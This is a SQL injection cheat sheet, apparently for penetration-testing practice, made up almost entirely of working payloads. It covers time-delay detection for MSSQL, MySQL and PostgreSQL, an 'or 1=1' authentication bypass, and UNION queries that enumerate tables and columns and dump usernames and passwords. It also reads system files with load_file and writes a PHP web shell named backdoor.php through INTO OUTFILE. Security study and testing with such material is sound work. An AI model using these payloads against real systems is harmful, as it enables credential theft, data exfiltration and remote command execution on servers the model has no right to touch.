# SQLi Cheat Sheet

## Database Vulnerabilities
Playing with SQL Syntax A great tool I have found for playing with SQL Syntax for a variety of database types (MSSQL Server, MySql, PostGreSql, Oracle) is SQL Fiddle:
http://sqlfiddle.com

Another site is rextester.com:
http://rextester.com/l/mysql_online_compiler

## Enumerating the Database
http://192.168.11.35/comment.php?id=738)'

## Detecting SQL Injection Vulnerabilities.

MSSQL Server SQL Injection Time Delay Detection: Add a 30 second delay to a MSSQL Server Query
Original Query
```sql
SELECT * FROM products WHERE name='Test';
```

Injection Value
```
sql'; WAITFOR DELAY '00:00:30'; --
```

Resulting Query
```sql
SELECT * FROM products WHERE name='Test'; WAITFOR DELAY '00:00:30'; --
```

MySQL Injection Time Delay Detection: Add a 30 second delay to a MySQL Query
Original Query
```sql
SELECT * FROM products WHERE name='Test';
```

Injection Value
```sql
'-SLEEP(30); #
```

Resulting Query
```sql
SELECT * FROM products WHERE name='Test'-SLEEP(30); #
```

PostGreSQL Injection Time Delay Detection: Add a 30 second delay to an PostGreSQL Query
Original Query
```sql
SELECT * FROM products WHERE name='Test';
```

Injection Value
```sql
'; SELECT pg_sleep(30); --
```

Resulting Query
```sql
SELECT * FROM products WHERE name='Test'; SELECT pg_sleep(30); --
```

Authentication Bypass
```sql
name='wronguser' or 1=1;
name='wronguser' or 1=1 LIMIT 1;
```


## Injection

Check if you can find a row, where you can place your output
```sql
id=1 union all select 1,2,3,4,5,6,7,8
```

Get the version of the database 
```sql
id=1 union all select 1,2,3,@version,5
```

Get the current user
```sql
id=1 union all select 1,2,3,user(),5
```

Get all tables
```sql
id=1 union all select 1,2,3,table_name,5 from information_schema.tables
```

Get column names for specified table
```sql
id=1 union all select 1,2,3,column_name,5 from information_schema.columns where table_name = 'users'
```

Get username, password in a single output (0x3a is ':')
```sql
id=1 union all select 1,2,3,concat(name, 0x3a, password),5 from users
```

Read file
```sql
select * from comments where id=738 union select 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts'),6;
```

Write into a file (e.g: writing .php file)
```sql
id=1 union all select 1,2,3,"content",5 into OUTFILE 'cmd.php'
id=738 union all select  1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE  'c:/xampp/htdocs/backdoor.php'
```
